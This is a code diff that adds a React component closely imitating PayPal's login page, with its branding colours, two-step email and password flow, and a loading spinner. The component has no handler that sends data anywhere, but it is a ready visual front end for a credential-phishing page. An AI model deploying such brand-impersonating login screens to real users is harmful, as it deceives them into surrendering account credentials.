@@ -1,0 +1,212 @@
+import React, { useEffect, useState } from 'react';
+export function LoginPage() {
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
+  const [step, setStep] = useState<'email' | 'loading' | 'password'>('email');
+  const handleNext = () => {
+    if (email.trim()) {
+      setStep('loading');
+    }
+  };
+  const handleChange = () => {
+    setStep('email');
+    setPassword('');
+  };
+  useEffect(() => {
+    if (step === 'loading') {
+      const timer = setTimeout(() => {
+        setStep('password');
+      }, 1000);
+      return () => clearTimeout(timer);
+    }
+  }, [step]);
+  return (
+    <div className="relative min-h-screen w-full bg-[#f5f7fa] flex flex-col items-center justify-between font-['Inter',sans-serif]">
+      {/* Loading Overlay */}
+      {step === 'loading' &&
+      <div className="absolute inset-0 z-50 bg-white/70 flex items-center justify-center">
+          <svg
+          className="animate-spin"
+          width="56"
+          height="56"
+          viewBox="0 0 56 56"
+          fill="none"
+          xmlns="http://www.w3.org/2000/svg"
+          style={{
+            animationDuration: '0.9s'
+          }}>
+          
+            <circle
+            cx="28"
+            cy="28"
+            r="24"
+            stroke="#E5E7EB"
+            strokeWidth="3"
+            fill="none" />
+          
+            <path
+            d="M52 28a24 24 0 0 0-24-24"
+            stroke="#003087"
+            strokeWidth="3"
+            strokeLinecap="round"
+            fill="none" />
+          
+          </svg>
+        </div>
+      }
+
+      {/* Main Card */}
+      <div className="flex-1 flex items-center justify-center w-full px-4 py-12">
+        <div className="w-full max-w-[500px] bg-white rounded-2xl shadow-sm border border-gray-100 px-8 py-12 flex flex-col items-center">
+          {/* PayPal Logo */}
+          <h1 className="text-3xl font-black tracking-tight text-gray-900 mb-10">
+            <span className="text-[#003087]">Pay</span>
+            <span className="text-[#0079C1]">Pal</span>
+          </h1>
+
+          {step === 'email' || step === 'loading' ?
+          <>
+              {/* Email Input */}
+              <div className="w-full mb-2">
+                <div className="relative w-full">
+                  <input
+                  type="text"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  placeholder=" "
+                  className="peer w-full px-4 pt-6 pb-3 border-2 border-gray-300 rounded-lg text-base text-gray-900 outline-none focus:border-[#0079C1] transition-colors" />
+                
+                  <label className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-base pointer-events-none transition-all peer-focus:top-3.5 peer-focus:text-xs peer-focus:text-[#0079C1] peer-[:not(:placeholder-shown)]:top-3.5 peer-[:not(:placeholder-shown)]:text-xs">
+                    Email or mobile number
+                  </label>
+                </div>
+              </div>
+
+              {/* Forgot Email */}
+              <div className="w-full mb-6">
+                <a
+                href="#"
+                className="text-[#0079C1] text-sm font-semibold hover:underline">
+                
+                  Forgot email?
+                </a>
+              </div>
+
+              {/* Next Button */}
+              <button
+              onClick={handleNext}
+              className="w-full py-3.5 bg-[#0070BA] hover:bg-[#005EA6] text-white font-bold text-base rounded-full transition-colors mb-6">
+              
+                Next
+              </button>
+            </> :
+
+          <>
+              {/* Email Display with Change */}
+              <div className="flex items-center gap-3 mb-8">
+                <span className="text-base text-gray-900">{email}</span>
+                <button
+                onClick={handleChange}
+                className="text-[#0079C1] text-base font-semibold hover:underline">
+                
+                  Change
+                </button>
+              </div>
+
+              {/* Password Input */}
+              <div className="w-full mb-2">
+                <div className="relative w-full flex gap-2">
+                  <div className="relative flex-1">
+                    <input
+                    type={showPassword ? 'text' : 'password'}
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    placeholder=" "
+                    className="peer w-full px-4 pt-6 pb-3 border-2 border-gray-300 rounded-lg text-base text-gray-900 outline-none focus:border-[#0079C1] transition-colors bg-[#FFF9DB]" />
+                  
+                    <label className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm pointer-events-none transition-all peer-focus:top-3.5 peer-focus:text-xs peer-focus:text-[#0079C1] peer-[:not(:placeholder-shown)]:top-3.5 peer-[:not(:placeholder-shown)]:text-xs">
+                      Password
+                    </label>
+                  </div>
+                  <button
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="px-3 py-2 border-2 border-gray-300 rounded-lg text-[#0079C1] text-sm font-semibold hover:border-[#0079C1] transition-colors shrink-0">
+                  
+                    {showPassword ? 'Hide' : 'Show'}
+                  </button>
+                </div>
+              </div>
+
+              {/* Forgot Password */}
+              <div className="w-full mb-6">
+                <a
+                href="#"
+                className="text-[#0079C1] text-sm font-semibold hover:underline">
+                
+                  Forgot password?
+                </a>
+              </div>
+
+              {/* Log In Button */}
+              <button className="w-full py-3.5 bg-[#0070BA] hover:bg-[#005EA6] text-white font-bold text-base rounded-full transition-colors mb-6">
+                Log In
+              </button>
+            </>
+          }
+
+          {/* Divider */}
+          <div className="w-full flex items-center gap-4 mb-6">
+            <div className="flex-1 h-px bg-gray-300" />
+            <span className="text-gray-500 text-sm">or</span>
+            <div className="flex-1 h-px bg-gray-300" />
+          </div>
+
+          {/* Sign Up Button */}
+          <button className="w-full py-3.5 border-2 border-gray-800 text-gray-900 font-bold text-base rounded-full hover:bg-gray-50 transition-colors mb-10">
+            Sign Up
+          </button>
+
+          {/* Language Selector */}
+          <div className="flex items-center gap-2 text-sm text-gray-600 mt-auto">
+            <span className="text-lg">🇺🇸</span>
+            <span className="font-semibold text-gray-900">English</span>
+            <span className="text-gray-300">|</span>
+            <a href="#" className="hover:underline">
+              Français
+            </a>
+            <span className="text-gray-300">|</span>
+            <a href="#" className="hover:underline">
+              Español
+            </a>
+            <span className="text-gray-300">|</span>
+            <a href="#" className="hover:underline">
+              中文
+            </a>
+          </div>
+        </div>
+      </div>
+
+      {/* Footer */}
+      <footer className="w-full bg-gray-800 py-4 px-6">
+        <div className="flex items-center justify-center gap-4 text-xs text-gray-300 flex-wrap">
+          <a href="#" className="hover:text-white hover:underline">
+            Contact Us
+          </a>
+          <a href="#" className="hover:text-white hover:underline">
+            Privacy
+          </a>
+          <a href="#" className="hover:text-white hover:underline">
+            Legal
+          </a>
+          <a href="#" className="hover:text-white hover:underline">
+            Policy Updates
+          </a>
+          <a href="#" className="hover:text-white hover:underline">
+            Worldwide
+          </a>
+        </div>
+      </footer>
+    </div>);
+
+}
